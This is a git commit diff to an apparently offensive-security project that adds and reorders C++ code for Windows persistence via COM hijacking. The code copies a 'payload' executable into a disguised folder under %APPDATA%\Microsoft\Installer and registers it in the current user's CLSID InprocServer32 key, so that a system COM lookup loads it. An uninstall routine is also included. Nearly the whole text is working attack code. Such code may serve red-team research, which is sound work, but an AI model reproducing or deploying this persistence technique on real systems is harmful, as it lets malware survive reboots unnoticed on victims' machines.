15fcd782a504c94c0444fb270c156a72087b6759
weixingyu <weixingyu@360.cn>
2021-11-11 18:25:48 +0800

    add com startup

--- windows_startup/com_hijack.cpp
+++ windows_startup/com_hijack.cpp
@@ -1,35 +1,5 @@
 #include "com_hijack.h"
 
-bool StartupCom::uninstall()
-{
-	HKEY hKey;
-	DWORD dwDisposition;
-	char folder_path[MAX_PATH] = { 0 };
-	string payload_path;
-	char threading_model[] = "Apartment";
-	ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}", folder_path, MAX_PATH);
-	payload_path = folder_path + string("\\") + m_target_file;
-	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
-		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
-	{
-		printf("RegCreateKey error£¡");
-		return false;
-	}
-	if (ERROR_SUCCESS != RegDeleteValueA(hKey, NULL))
-	{
-		printf("Remove DLL error£¡");
-		return false;
-	}
-	if (ERROR_SUCCESS != RegDeleteValueA(hKey, "ThreadingModel"))
-	{
-		printf("Remove ThreadingModel error£¡");
-		return false;
-	}
-	remove(payload_path.c_str());
-	remove(folder_path);
-	printf("com hijacking uninstall success!\r\n");
-}
-
 bool StartupCom::install()
 {
 	HKEY hKey;
@@ -43,16 +13,16 @@ bool StartupCom::install()
 	payload_path = folder_path + string("\\") + m_target_file;
 	if (!CreateDirectoryA(folder_path2, NULL))
 	{
-		printf("create dir:%s error with code:%d!", folder_path, GetLastError());
+		printf("[*] create dir:%s error with code:%d!", folder_path, GetLastError());
 		return false;
 	}
 	if (!CreateDirectoryA(folder_path, NULL))
 	{
-		printf("create dir:%s error with code:%d!", folder_path, GetLastError());
+		printf("[*] create dir:%s error with code:%d!", folder_path, GetLastError());
 		return false;
 	}
-	CopyFileA("com_hijack.exe", payload_path.c_str(), NULL);
-	printf("payload_path:%s", payload_path);
+	CopyFileA(m_target_file.c_str(), payload_path.c_str(), NULL);
+	cout << "payload_path:" << payload_path << endl;
 	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
 		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
 	{
@@ -72,4 +42,34 @@ bool StartupCom::install()
 	printf("com hijacking install success!\r\n");
 
 	return true;
+}
+
+bool StartupCom::uninstall()
+{
+	HKEY hKey;
+	DWORD dwDisposition;
+	char folder_path[MAX_PATH] = { 0 };
+	string payload_path;
+	char threading_model[] = "Apartment";
+	ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Installer\\{BCDE0395-E52F-467C-8E3D-C4579291692E}", folder_path, MAX_PATH);
+	payload_path = folder_path + string("\\") + m_target_file;
+	if (ERROR_SUCCESS != RegCreateKeyExA(HKEY_CURRENT_USER,
+		"Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\\InprocServer32", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition))
+	{
+		printf("[!] RegCreateKey error£¡");
+		return false;
+	}
+	if (ERROR_SUCCESS != RegDeleteValueA(hKey, NULL))
+	{
+		printf("[!] Remove DLL error£¡");
+		return false;
+	}
+	if (ERROR_SUCCESS != RegDeleteValueA(hKey, "ThreadingModel"))
+	{
+		printf("[!] Remove ThreadingModel error£¡");
+		return false;
+	}
+	remove(payload_path.c_str());
+	remove(folder_path);
+	printf("[*] com hijacking uninstall success!\r\n");
 }
